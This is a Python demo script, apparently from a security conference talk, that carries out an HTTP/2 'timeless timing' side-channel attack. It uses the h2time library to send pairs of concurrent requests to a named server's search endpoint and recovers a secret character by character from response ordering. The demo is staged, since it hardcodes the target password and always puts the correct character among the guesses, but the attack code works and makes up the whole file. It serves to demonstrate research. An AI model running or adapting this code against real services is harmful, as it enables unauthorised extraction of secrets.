from h2time import H2Time, H2Request
import asyncio
import string
import random
import curses
import json
import time

charset = string.ascii_letters + string.digits
password = 'T1mel3ssT1mingAtt4cks'
x_offset = 5
y_offset = 10
server = 'vault.drud.us'

async def check_character(already_found, char):
    opts = {'user-agent': 'Timeless Timing Attack Demo'}
    r1 = H2Request('GET', 'https://%s/search.php?q=BLACKHAT_PASSWORD=%s%s' % (server, already_found, char), opts)
    r2 = H2Request('GET', 'https://%s/search.php?q=BLACKHAT_PASSWORD=%s%s' % (server, already_found, '@'), opts) # @ is not part of the charset
    num_request_pairs = 15
    async with H2Time(r1, r2, num_request_pairs=num_request_pairs, sequential=False, inter_request_time_ms=50, num_padding_params=0) as h2t:
        results = await h2t.run_attack()
        return len(list(filter(lambda x: x[0] < 0, results))) / len(results)

async def run_attack():
    found_so_far = ''
    for idx in range(21):#range(21):
        next_charset = set([random.choice(charset) for _ in range(4)])
        next_charset.add(password[idx])
        next_charset_lst = list(next_charset)
        random.shuffle(next_charset_lst)

        percentages = {}
        stdscr.addstr(0 + y_offset, 0 + x_offset, 'Found so far: %s' % found_so_far, curses.A_BOLD)
        stdscr.addstr(0 + y_offset, 14 + x_offset, found_so_far)
        for attempt in next_charset_lst:
            stdscr.addstr(2 + y_offset, 0 + x_offset, 'Now trying: ', curses.A_BOLD)
            stdscr.addstr(2 + y_offset, 12 + x_offset, attempt)
            stdscr.refresh()
            pct_reverse_order = await check_character(found_so_far, attempt)
            percentages[attempt] = pct_reverse_order * 100
            stdscr.addstr(4 + y_offset, 0 + x_offset, 'Percentage that arrived in reverse order: {%s}' % ', '.join(['"%s": %.2f' % (k, v) for k, v in percentages.items()]) + (' ' * 80))
            stdscr.refresh()
            if pct_reverse_order > 0.8:
                found_so_far += attempt
                break

    stdscr.addstr(6 + y_offset, 0 + x_offset, 'FOUND IT!!! %s' % found_so_far, curses.A_BOLD + curses.color_pair(1))


stdscr = curses.initscr()
curses.start_color()
curses.init_pair(1, curses.COLOR_RED, curses.COLOR_WHITE)
curses.noecho()
curses.cbreak()
curses.curs_set(0)

try:
    loop = asyncio.get_event_loop()
    loop.run_until_complete(run_attack())
    loop.close()
finally:
    curses.echo()
    curses.nocbreak()
    curses.endwin()